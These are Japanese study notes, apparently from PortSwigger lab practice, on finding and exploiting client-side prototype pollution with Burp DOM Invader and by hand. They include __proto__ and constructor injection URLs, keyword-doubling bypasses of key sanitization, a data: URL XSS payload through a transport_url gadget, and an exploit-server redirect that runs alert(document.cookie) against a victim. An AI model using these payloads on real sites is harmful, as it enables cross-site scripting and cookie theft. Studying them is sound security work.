## CSPPのメソドロジー

### DOM Invaderでsourceが検出できる場合

1. DOM InvaderのAttack -> Prototype pullution is onに設定しておくと自動でsourceを検出する
2. "Scan for gadgets"ボタンを押す
3. 開かれた新しいタブで"Exploit"ボタンを押す
###### `alert(1)`が成功した場合
- 目的のpayloadへ変更し、エクスプロイトサーバに以下のスクリプトをホストし被害者へ送信
```js
<script>
    location = "[alert(document.cookie)が実行される絶対URL]" 
</script>
```

###### 失敗した場合
- [3. Client-side prototype pollution(CSPP)](#DOM%20XSSにおけるContextの確認方法)で実行できることを確認
- その後[3. Client-side prototype pollution(CSPP)](#`alert(1)`が成功した場合)と同じ

### DOM Invaderでsourceが検出できない場合

1. [3. Client-side prototype pollution(CSPP)](#keyサニタイズ欠陥の悪用ステップ(Client-side%20prototype%20pollution%20via%20flawed%20sanitization))で`alert(1)`を表示する
2. その後[3. Client-side prototype pollution(CSPP)](#`alert(1)`が成功した場合)と同じ

## CSPP sourceの見つけ方

#### 手動でのsource発見

- DOM Invaderの方が便利だが、サニタイズされている場合はこの方法を使う

- sourceが見つかるまで`Object.prototype`に任意のプロパティを追加する様々な方法を試す

1. クエリ文字列、URLフラグメント、任意のJSON inputを介して任意のプロパティを注入する
- 例
```http
vulnerable-website.com/?__proto__[foo]=bar
```

2. ブラウザの開発者ツール -> Consoleから、`Obuject.prototype`を任意のプロパティで汚染できているかを確認する
```js
Object.prototype.foo
// "bar" : 汚染成功
// undefined : 失敗
```

3. 失敗したら記法を変えて試す。`[]` -> `.`
```http
vulnerable-website.com/?__proto__.foo=bar
```

4. 1 ~ 3を潜在的なsourceに試していく

- もしうまくいかなかったら、[3. Client-side prototype pollution(CSPP)](#constructorによるPrototype汚染)

### DOM Invaderでのsource発見

- 詳細：[Testing for client-side prototype pollution](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#detecting-sources-for-prototype-pollution)
- DOM InvaderのAttack -> Prototype pullution is onに設定しておくこと
- 自動的にsourceを検出できる
![[Pasted image 20240203220129 1.png| 500]]

###### 検出後の確認の流れ

1. "Test"ボタンを押す
2. 新しいタブが開かれるので、そこでConsoleを開き、`Object.prototype`の出力を確認する
3. `testproperty`(検証のための文字列)が表示されていることを確認する
4. consoleで新しいオブジェクトを作成する
```js
let myObject = {};
```
5. 作成したオブジェクトに`testproperty`(プロパティ)がprototype chainによって継承されていることを確認する
```js
console.log(myObject.testproperty);
// Output: 'DOM_INVADER_PP_POC'
```

## CSPP gadgetの見つけ方

#### 手動でのgadget発見

- DOM Invaderの方が便利だが、サニタイズされている場合はこの手法を使う

1. 開発者ツールのSourcesタブから"js"のファイルを選択
2. [2. Prototype汚染が成功する条件](2.%20Prototype汚染が成功する条件.md#Prototype%20pollution%20gadgets)を参考に、Gadgetとなりそうなプロパティに目星をつける
	- `config`オブジェクトが狙い目
	- 特に対象のオブジェクトで狙い目のプロパティが定義されていない事が大事

3. Consoleタブで、目星をつけたプロパティで以下を実行する
```js
Object.defineProperty(Object.prototype, '[プロパティ]', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```

4. 結果を展開して、狙い目のプロパティの値が`"polluted"`になっていたらGadgetとして使える

### DOM Invaderでのgadget発見

- 詳細: [Scanning for prototype pollution gadgets](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#detecting-sources-for-prototype-pollution:~:text=Scanning%20for%20prototype%20pollution%20gadgets)
1. Testによって新しく開かれたタブではなく、元のタブのDOM viewにて、"Scan for gadgets"をクリックする
	- prototype汚染sourceの横にある

2. 新しいタブが開かれるのでDOM Invaderタブを開く。スキャンが終了すると"Sinks"が表示される

##### 💡目的に合わせてPrototype pullutionを設定できる

- 詳細は[Prototype pollution settings](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/prototype-pollution)
- sourceが見つからない時 -> Scan for gadgets is onに
- Query string injection ~ JSON injectionは正常な動作を妨げられている場合のみoff

## constructorによるPrototype汚染

###### 基本

- DOM Invaderで2つPrototype pollutionの可能性が提示される
- 1つ目は`__proto__`によるもの。もう1つがconstructorを使ったもの。
- 以下、`constructor.prototype`は`__proto__`と同じ役割で、`__proto__`が使えない時の代替
```js
myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype
```

###### 悪用

- **＊**: DOM Invaderで`__proto__`の方法がうまくいかなかったら、もう1つのconstructorを使用する方法を使えばいいだけ

## Bypassing flawed key sanitization(手動)

###### 基本概念

- key = プロパティ名(キー)
- key検証の欠陥を悪用する。
	- 本来はkeyを再帰的にサニタイズする必要がある

- 例えば`__proto__`という文字列を1度だけ排除するサニタイズ
```js
vulnerable-website.com/?__pro__proto__to__.gadget=payload
```
	↓
```js
vulnerable-website.com/?__proto__.gadget=payload
```

### keyサニタイズ欠陥の悪用ステップ(Client-side prototype pollution via flawed sanitization)

1. sourceを見つける([3. Client-side prototype pollution(CSPP)](#手動でのsource発見))。その際、サニタイズされることを考えて以下のように注入していく
```
/?__pro__proto__to__[foo]=bar
/?__pro__proto__to__.foo=bar
/?constconstructorructor[protoprototypetype][foo]=bar
/?constconstructorructor.protoprototypetype.foo=bar
```

2. [3. Client-side prototype pollution(CSPP)](#手動でのgadget発見)でgadgetとして`transport_url`プロパティが使えることがわかったとする
3. Sinkを明らかにするために適当な値を注入し、Elementsタブから注入した値が反映されている場所を確認する
```
/?__pro__proto__to__[transport_url]=bar
```
	↓
```html
<script src="foo"></script>
```

4. 上記のコンテキストの場合、データURLを使用してXSSペイロードを直接埋め込む
```
/?__pro__proto__to__[transport_url]=data:,alert(1);//
```
